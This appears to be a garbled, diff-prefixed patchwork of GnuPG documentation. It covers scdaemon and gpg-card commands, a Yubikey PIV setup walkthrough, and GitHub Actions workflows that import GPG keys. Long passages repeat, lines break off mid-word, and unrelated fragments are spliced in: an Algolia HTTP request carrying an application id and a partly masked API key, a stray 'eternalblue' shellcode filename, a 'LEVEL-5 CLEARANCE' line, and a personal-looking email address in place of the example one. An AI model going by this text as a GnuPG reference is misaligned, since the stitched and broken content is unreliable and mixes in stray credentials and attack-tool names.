+  PKSIGN --hash=algoname keyid
+
+READCERT hexified_certid|keyid
+READKEY hexified_certid
+SETDATA hexstring
+d
+
+  PKSIGN keyid
+ LEARN
+
+  PKSIGN --hash=algoname keyid
+
+WRITEKEY [--force] keyid
+WRITEKEY [--force] keyid
+PASSWD [--reset] [--nullpin] chvno
+CHECKPIN idstr
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+this:
+
+     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import 
+
+command --locate-external-key
+command --locate-external-key
+github/workflows/release.yml:
+ldap://keys.(thedomain)
+‘--auto-key-locate
+ --auto-key-locate
+--auto-key-retrieve
+
+
+ honor-keyserver-url 
+
+-sig-keyserver-url
+--recv-key
+honor-keyserver-url
+--use-agent
+--gpg-agent-info
+
+
+--no-random-seed-file
+Host: c7-use-3.algolianet. com
+Accept: */*
+Sec-Fetch-Site: cross-site
+Accept-Language: en-US, en; q=0.9
+Accept-Encoding: gzip, deflate, br
+Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
+Origin: https://dashboard.algolia.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
+x-algolia-api-key: b3cf*************************米**
+Content-Length: 27
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Sec-Fetch-Dest: empty
+
+scdaemon.conf
+1
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+--debug-level level
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+scd-event
+HKCU\Software\GNU\GnuPG:HomeDir
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+reader_n.status
+HKCU\Software\GNU\GnuPG:HomeDir
+
+trustlist.txt file
+gpg-agent.conf
+HKCU\Software\GNU\GnuPG:HomeDir
+name: release
+debug-pinentry 
+--debug 1024
+
+global trustlist (/usr/local/etc/gnupg/trustlist.tx
+
+Active cards
+Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
+gpg-connect-agent updatestartuptty /bye
+Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
+
+gpg-connect-agent /bye
+--scdaemon-program filename
+Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
+--check-passphrase-pattern file
+--check-sym-passphrase-pattern file
+Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
+bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
+Keys listed in the sshcontrol file
+--disable-extended-key-format
+These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
+
+--enable-ssh-support
+--enable-win32-openssh-support
+--enable-putty-support
+
+gpg-connect-agent 'GETINFO s2k_count' /bye
+gpg-connect-agent 'GETINFO s2k_time' /bye
+To view the auto-calibrated count use:
+
+gpg-connect-agent 'GETINFO s2k_count_cal' /bye
+--ssh-fingerprint-digest
+Keys listed in the sshcontrol file
+
+Active card
+gpg-connect-agent /bye
+bashrc or whatever initialization file is used for all shell invocations:
+
+GPG_TTY=$(tty)
+export GPG_TTY
+--daemon [command line]
+server
+
+agent-program file ¶
+Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
+
+--gpg-program file
+Specify a non-default gpg binary to be used by certain commands.
+
+--gpgsm-program file
+Specify a non-default gpgsm binary to be used by certain commands.
+
+--chuid uid
+Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
+
+gpg-card
+AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
+AUTH
+FETCH
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+KDF-SETUP ¶
+Prepare the OpenPGP card KDF feature for this card.
+
+LANG [--clear]
+Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
+NAME [--clear]
+PRIVATEDO [--clear] n [< file] file
+READCERT [--openpgp] certref > file ¶
+Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
+URL [--clear]
+gpg's. --fetch 
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+ --openpgp
+file 
+fpr.
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref.
+CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
+Serial number
+A hex-string with the serial number of the card.
+
+Type
+This gives the type of the card’s application. For example "OpenPGP" or "PIV".
+
+Keygrip
+A hex-string identifying a key.
+
+Keyref
+The application slot where the key is stored on the card. For example "OpenPGP.1"
+
+Status
+The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
+
+YUBIKEY cmd args
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
+
+GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV Application PIN
+This is the string 123456.
+
+PIN Unblocking Key
+This is the string 12345678.
+list (the string gpg/card>
+card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          go_version: "1.16"
+Then
+- uses: cli/gh-extension-precompile@v1
+  env:
+    CGO_ENABLED: 1
+- uses: cli/gh-extension-precompile@v1
+  with:
+    build_script_override: "script/build.sh"
+name: release
+
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - id: import_gpg
+        uses: crazy-max/ghaction-import-gpg@v5
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.GPG_PASSPHRASE }}
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS
+gpg --armor --export-secret-key joe@foo.bar | pbcopy
+
+# Ubuntu (assuming GNU base64)
+gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
+
+# Arch
+gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
+
+# FreeBSD (assuming BSD base64)
+gpg --armor --export-secret-key joe@foo.bar | xclip
+
+name: import-gpg
+
+on:
+  push:
+    branches: master
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+      -
+        name: List keys
+        run: gpg -K
+name: import-gpg
+
+on:
+  push:
+    branches: master
 
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
+      -
+        name: List keys
+        run: gpg -K
+
+pub   ed25519 2021-09-24 [C]
+      87F257B89CE462100BEC0FFE6071D218380FDCC8
+      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid           [ unknown] Joe Bar <joe@bar.foo>
+sub   ed25519 2021-09-24 [S]
+      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
+      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg
+/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
+
+application-priority piv
+to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
+
+With one of these methods employed the list command of gpg-card shows this:
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+list --cards
+well. The PIV authentication key (internal reference PIV.9A
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+ ‘--force’
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip
+gpg
+self-signed X.509 certificate (exit the gpg-card tool, first):
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip 
+gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+gpgsm --with-keygrip -k 6309304695z@gmail.com
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> 6309304695z@gmail.com
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: 6309304695z@gmail.com
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+‘gpgsm --learn’
+Digital signature’ key
+gpg-card:010203040506070801020304050607080102030405060708
+
+shellcode/eternalblue_sc_merge.py
+
+gpg/card> writecert PIV.9C < sign.crt
 on:
   push:
     branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key]
AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref
Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
Write a certificate to the card under the id certref. 

WRITEKEY [--force] keyref keygrip ¶
Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
—Shadowed

YUBIKEY cmd args ¶
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp
gpg/card> yubikey list
Application  USB    NFC
-----------------------
OTP          yes    yes
U2F          yes    yes
OPGP         no     no
PIV          yes    no
OATH         yes    yes
FIDO2        yes    yes
gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D 
—force

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

[...]
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

PIV authentication’ key with ssh:

$ ssh-add -l
384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn
$ gpg --full-gen-key
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 3
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name:
Email address: otto@example.net
Comment:
You selected this USER-ID:
    "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
gpg: key C3AFA9ED971BB365 marked as ultimately trusted
gpg: revocation certificate stored as '[...]D971BB365.rev'
public and secret key created and signed.

Note that this key cannot be used for encryption.  You may want to use
the command "--edit-key" to generate a subkey for this purpose.
pub   rsa2048 2019-04-04 [SC]
      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
uid                      otto@example.net
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
Secret key is available.

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
[ultimate] (1). otto@example.net
gpg> addkey
Secret parts of primary key are stored on-card.
Please select what kind of key you want:
   (3) DSA (sign only)
   (4) RSA (sign only)
   (5) Elgamal (encrypt only)
   (6) RSA (encrypt only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 4
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y
Really create? (y/N) y

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
ssb  rsa2048/7067860A98FCE6E1
     created: 2019-04-04  expires: never       usage: E
     card-no: FF020001008A77C1
[ultimate] (1). otto@example.net

gpg> save
Now you can use your PIV card also with gpg.


     # 000006
/* 32A19-D90712   
LEVEL-5 CLEARANCE ONLY
 ‘--force’
authentication key 
-header-'010203040506070801020304050607080102030405060708'
SETDATA hexstring
to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

  PKSIGN keyid
where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

  PKSIGN --hash=algoname keyid
READKEY hexified_certid
READCERT hexified_certid|keyid
SERIALNO
Return the serial number of the card using a status response like:

  S SERIALNO D27600000000000000000000
 WRITEKEY [--force] keyid
SETDATA hexstring
to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

  PKDECRYPT keyid
CHECKPIN idstr
RESTART
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va
CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
  A6935DD34EF3087973C706FC311AA2CCF733765B S

  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  
       # Key added on: 2011-07-20 20:38:46
       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
